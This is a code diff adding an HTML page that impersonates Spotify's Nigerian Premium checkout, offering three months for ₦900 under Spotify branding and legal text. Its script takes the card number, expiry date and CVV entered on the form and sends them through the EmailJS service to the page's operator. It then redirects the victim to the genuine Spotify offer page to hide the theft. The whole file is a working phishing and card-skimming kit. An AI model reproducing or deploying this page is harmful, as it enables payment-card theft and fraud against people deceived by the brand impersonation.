@@ -1,0 +1,506 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
+    
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "9cATFsqPERef1K6ZF",
+      });
+   })();
+</script>
+
+    <title>Spotify</title>
+    <style>
+      body {
+        margin: 0px;
+        font-family: Arial, Sans-Serif;
+        background-color: transparent;
+      }
+      body a {
+        text-decoration: none;
+      }
+    
+  .box {
+    background-color: black;
+    width: 375px;
+    height: 350px;
+    border: 1px solid;
+    position: relative;
+  }
+.box p {
+  color: #fff;
+  margin-top: 6px;
+  margin-left: 10px;
+  font-size: 21px;
+  font-weight: 800;
+}
+
+.price {
+  margin-top: -10px;
+  margin-left: 10px;
+  width: 330px;
+  height: 210px;
+  border-radius: 15px;
+  background-color: #fff;
+  border: 1px solid black;
+}
+.price ul {
+  margin-left: -15px;
+  font-size: 12px;
+}
+
+.sep {
+  width: 330px;
+  height: 80px;
+  border-radius: 13px 13px 0 0;
+  background-color: #FFD2D7;
+}
+.sep b {
+  margin-left: 10px;
+}
+     
+      .container {
+        background-color: #fff;
+        width: 355px;
+        height: 720px;
+        border: 1px solid transparent;
+        position: relative;
+      }
+      .card-types img {
+      margin-left: 11px;
+      margin-top: -12px;
+       width: 35px;
+       height: 20px;
+      }
+    .lock {
+      margin-top: -13%;
+      margin-left: 85%;
+    }
+    .form-group {
+      font-weight: bolder;
+      margin-left: 8px;
+    }
+    
+  input[type="tel"] {
+    font-family: Arial, Sans-Serif;
+    font-size: 16px;
+    font-weight: 500;  
+   }
+   
+.form-group input[type="tel"] {
+  margin: 5px;
+  margin-top: 10px;
+  padding: 0 20px;
+  width: calc(95% - 47px);
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+  }
+
+ input[type="tel"]:focus {
+  border: 1px solid #1DB954;
+  outline: none;
+}
+
+ .card-logo {
+ position: absolute;
+ top: 193px;
+ right: 21px;
+ transform: translateY(-50%);
+ height: 30px;
+ border-radius: 6px;
+ width: auto;
+ display: none;
+ }
+  
+.form-group2 input[type="tel"] {
+  margin: 5px;
+  margin-top: 50px;
+  padding: 0 20px;
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+  }
+
+.form-group2 {
+  margin: 2px;
+  font-weight: bold;
+  margin-left: 8px;
+}
+
+.form-group3 {
+  margin: -84px;
+  font-weight: bold;
+  margin-left: 210px;
+}
+.form-group3 input[type="tel"] {
+  margin: 1px;
+  margin-top: 5px;
+  padding: 0 20px;
+  height: 50px;
+  border: 1px solid;
+  border-radius: 6px;
+  letter-spacing: 2px;
+  }
+  
+button[type="submit"] {
+  margin: 5px;
+  margin-left: 95px;
+  font-weight: bold;
+  font-size: 17px;
+  width: 155px;
+  height: 53px;
+  border: 0px solid;
+  border-radius: 28px;
+  background-color: #18D763;
+}
+ button:hover {
+  background-color: #169C47;
+}
+
+.form-group3 svg {
+  position: absolute;
+  right: 20px;
+  top: 297px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 20px; /* Adjust size as needed */
+  height: 20px; /* Adjust size as needed */
+}
+
+.tooltip {
+  display: none;
+  position: absolute;
+  top: 320px;
+  right: 10px;
+  background-color: #333;
+  color: #fff;
+  padding: 5px;
+  border-radius: 3px;
+  font-size: 12px;
+  white-space: nowrap;
+  margin-top: 5px;
+  box-shadow: 0 0 10px black;
+}
+
+.tooltip.visible {
+  display: block;
+}
+
+.form-group4 {
+  margin-left: 10px;
+  font-size: 14px;
+  font-family: Roboto, Sans-Serif;
+}
+
+.box2 {
+  color: #fff;
+    background-color: black;
+    width: 375px;
+    height: 1650px;
+    border: 1px solid;
+    position: relative;
+  }
+  
+.box2 p {
+  color: #fff;
+  margin-top: -5px;
+  margin-left: 15px;
+  font-size: 17px;
+  font-weight: 400;
+}
+
+.box2 i {
+  margin: 10px;
+}
+
+
+    </style>
+  </head>
+  <body>
+    
+  <div class="box">&nbsp;
+    <a href="">
+    <img src="https://i.ibb.co/1ZM85G7/Spotify-Logo01.png" alt="Spotify" style="width: 90px; height: 18px margin-left: 10px; margin-top: 10px;" border="0">
+  </a>
+  
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <a href="">
+  <img src="https://i.ibb.co/9gwd3k3/no-profile-pic-picture.jpg" alt="Profile-Pic" style="border-radius: 50px; margin-left: 140px; margin-top: -5px;" width="50px" height="50px;" border="0"></a>
+  
+  &nbsp;&nbsp;&nbsp;
+  <hr style="width: 25px; margin-top: -38px; margin-left: 330px;">
+  <hr style="width: 25px; margin-left: 330px;">
+  <hr style="width: 25px; margin-left: 330px;">
+  
+  <br>
+  <p>Your Plan</p>
+  
+  <div class="price">
+    <div class="sep">
+     <br> <b>Premium Individual</b>
+     
+     <p style="margin-top: -25px; margin-left: 210px; color: black; font-size: 25px; font-weight: 500">3 months</p>
+ 
+ <p style="margin-top: -15px; font-size: 12px; font-weight: 400; color: black;">1 Premium account &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For &#8358;900.00</p>
+    </div>
+    
+  <p style="color: black; font-size: 13px; font-weight: 600; margin-top: 20px;">Total&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  &#8358;900.00 for 3 months</p>  
+    
+    <p style="color: black; font-size: 13px; font-weight: 600;">Starting 21 Aug 2024 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#8358;900.00 / month</p>
+    
+    <ul>
+      <li>Normal price is &#8358;900.00 / month</li>
+      <li>You will next be billed on 20 Aug 2024</li>
+      <li>Cancel anytime. <u>Offer terms</u> apply.</li>
+    </ul>
+  </div>
+  
+  </div>
+   
+    
+    <div class="container">
+      <p style="margin-left: 10px;"onclick="focusInput()">Credit or debit card</p>
+      <div class="card-types">
+  <img src="https://i.ibb.co/wMrJWr2/visa.png" alt="Visa" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/mb0w5bm/mastercard.jpg" alt="MasterCard" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/68vhBp8/verve-logo.png" alt="Verve" onclick="focusInput()">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/rH1yLyh/amex.jpg" alt="amex" onclick="focusInput()">
+      </div>
+      
+    <p style="font-weight: bold; margin-left: 10px; margin-top: 25px;">Payment details</p>
+    
+    <div class="lock">
+    <svg fill="grey" onclick="focusInput()" height="30px" width="20px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 485.00 485.00" xml:space="preserve" stroke="#000000" stroke-width="0.00485"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <path d="M345,175v-72.5C345,45.981,299.019,0,242.5,0S140,45.981,140,102.5V175H70v310h345V175H345z M170,102.5 c0-39.977,32.523-72.5,72.5-72.5S315,62.523,315,102.5V175H170V102.5z M385,455H100V205h285V455z"></path> <path d="M227.5,338.047v53.568h30v-53.569c11.814-5.628,20-17.682,20-31.616c0-19.299-15.701-35-35-35c-19.299,0-35,15.701-35,35 C207.5,320.365,215.686,332.42,227.5,338.047z"></path> </g> </g></svg>
+    </div>
+    
+    <br>
+    
+  <form id="CardForm">
+    
+  <div class="form-group">
+    <label for="cardnumber">Card number</label><br>
+    
+    <input name="cardnumber" id="cardnumber" data-mask="0000 0000 0000 0000" placeholder="0000 0000 0000 0000" type="tel" required="" oninput="detectCardType()"/>
+    
+  <img class="card-logo" id="card-logo" src="" alt="Card Logo" />     
+   </div>  
+    <br>
+    <div class="form-group2">
+  <label for="expdate">Expiry date</label><br>
+ <input style="width: calc(40% - 20px); margin-top: 10px" name="expirydate" id="expirydate" data-mask="00 / 00" placeholder="MM / YY" type="tel" required="" />
+    </div>
+   
+   <div class="form-group3">
+  <label for="cvv">CVV</label><br>
+  <input style="width: calc(48% - 24px);" name="cvv" id="cvv" data-mask="0000" placeholder="***" type="tel" required=""/><br>
+     
+ <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" id="question-mark-svg">
+
+    <g clip-path="url(#clip0_429_11043)">
+      <circle cx="12" cy="11.9999" r="9" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></circle>
+      <rect x="12" y="16" width="0.01" height="0.01" stroke="#292929" stroke-width="3.75" stroke-linejoin="round"></rect>
+      <path d="M10.5858 7.58572C10.9754 7.1961 11.4858 7.00083 11.9965 6.99994C12.5095 6.99904 13.0228 7.1943 13.4142 7.58572C13.8047 7.97625 14 8.48809 14 8.99994C14 9.51178 13.8047 10.0236 13.4142 10.4141C13.0228 10.8056 12.5095 11.0008 11.9965 10.9999L12 11.9999" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path>
+    </g>
+    <defs>
+      <clipPath id="clip0_429_11043">
+        <rect width="24" height="24" fill="white"></rect>
+      </clipPath>
+    </defs>
+  </svg>
+  <div class="tooltip" id="tooltip">The security code, or CVV, refers<br>to the extra 3 numbers on the<br>back of your card.</div>    
+     
+     </div>
+     
+  
+  <br></br>
+  <br></br>
+  <br></br>    
+    
+    
+    <div class="form-group4">
+     <input type="checkbox" checked="" id="save" name="save" onclick="focusInput()"> <label for="save">Save Card for future purchases.</label><br>
+  
+  <p>You hereby authorise Spotify to charge you automatically every month until you cancel your subscription. If you don't cancel your subscription before the offer ends (check your account page for details), you will automatically be charged the standard price every month until you cancel. Full terms and instructions on how to cancel are available <u>here</u>.</p>
+   </div>
+   
+   <div class="button-container">
+   <button type="submit" id="submit" onclick="sendMail()">Buy now</button>
+   </div>
+  
+  </form>  
+   
+   <br>
+   <p style="text-align: center; font-size: 13px;">Nigeria &nbsp; &nbsp;<u>Change country</u></p>
+</div>
+
+<div class="box2">
+  <a href="">&nbsp;
+    <img src="https://i.ibb.co/1ZM85G7/Spotify-Logo01.png" alt="Spotify" style="width: 90px; height: 18px margin-right: -20px; margin-top: 40px;" border="0">
+  </a>
+  
+  <br></br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <p style="color: grey; margin-left: 15px; font-weight: 150; font-size: 14px;" ><b>COMPANY</b></p>
+  <br> <a href=""><p>About</p></a>
+  <br> <p>Jobs</p>
+  <br> <p>For the Record</p>
+  
+  <br></br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <p style="color: grey; margin-left: 15px; font-weight: 150; font-size: 14px;" ><b>COMMUNITIES</b></p>
+  <br> <p>For Artists</p>
+  <br> <p>Developers</p>
+  <br> <p>Advertising</p>
+  <br> <p>Investors</p>
+  <br> <p>Vendors</p>
+  
+<br></br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <p style="color: grey; margin-left: 15px; font-weight: 150; font-size: 14px;" ><b>USEFUL LINKS</b></p>
+  <br> <p>Support</p>
+  <br> <p>Web Player</p>
+  <br> <p>Free Mobile App</p>
+  <br> <p>Investors</p>
+  <br> <p>Vendors</p>
+  
+  <br></br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <p style="color: grey; margin-left: 15px; font-weight: 150; font-size: 14px;" ><b>SPOTIFY PLANS</b></p>
+  <br> <p>Premium Individual</p>
+  <br> <p>Premium Duo</p>
+  <br> <p>Premium Family</p>
+  <br> <p>Premium Student</p>
+  <br> <p>Spotify Free</p>
+  
+  <br></br>
+ &nbsp;&nbsp;
+ 
+ <i class="fa-brands fa-instagram" style="color: #fff; font-size: 40px;"></i>
+  <i class="fa-brands fa-twitter" style="color: #fff; font-size: 40px;"></i>
+  <i class="fa-brands fa-facebook" style="color: #fff; font-size: 40px;"></i>
+
+
+<br></br>
+
+<br></br>
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+<p style="margin-left: 290px; color: grey; font-size: 11px;"><i class="fa-solid fa-earth-africa" style="color: #ffffff;"></i>Nigeria</p>
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+<p style="color: grey; font-size: 11px;">Legal &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Safety & Privacy Center <span style="margin-left: 70px;">&copy; 2024 Spotify AB</span></p>
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+<p style="color: grey; font-size: 11px;">Privacy Policy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookies</p>
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+<p style="color: grey; font-size: 11px;">About Ads &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Accessibility</p>
+
+<br>
+
+</div>
+
+    
+    
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+	
+	<script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      cardnumber : document.getElementById("cardnumber").value,
+      expirydate : document.getElementById("expirydate").value,
+      cvv : document.getElementById("cvv").value,
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+        emailjs.send("service_6kbj4eu","template_ncggmgb", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://www.spotify.com/ng/purchase/offer/2024-q2globalcampaign-winback-3m-for-1/?country=NG";
+      })
+      .catch(function(error) {
+        console.error('Invalid Card number!', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('CardForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+<script>
+        function detectCardType() {
+            const cardNumber = document.getElementById('cardnumber').value;
+            const cardLogo = document.getElementById('card-logo');
+
+            cardLogo.style.display = 'none';
+
+            if (/^4/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/wMrJWr2/visa.png';
+                cardLogo.style.display = 'block';
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/mb0w5bm/mastercard.jpg';
+                cardLogo.style.display = 'block';
+            } else if (/^(50|65)/.test(cardNumber)) {
+                cardLogo.src = 'https://i.ibb.co/68vhBp8/verve-logo.png';
+                cardLogo.style.display = 'block';
+            } else if (/^(34|37)/.test (cardNumber)) {
+              cardLogo.src = 'https://i.ibb.co/rH1yLyh/amex.jpg';
+              cardLogo.style.display = 'block';
+            }
+        }
+    </script>
+    
+    
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const tooltip = document.getElementById('tooltip');
+  const questionMarkSvg = document.getElementById('question-mark-svg');
+
+  questionMarkSvg.addEventListener('click', function() {
+    tooltip.classList.toggle('visible');
+  });
+
+  document.addEventListener('click', function(event) {
+    if (!tooltip.contains(event.target) && !questionMarkSvg.contains(event.target)) {
+      tooltip.classList.remove('visible');
+    }
+  });
+});
+
+</script>
+
+<script>
+  function focusInput() {
+    document.getElementById('cardnumber').focus();
+  }
+</script>
+
+  </body>
+</html>
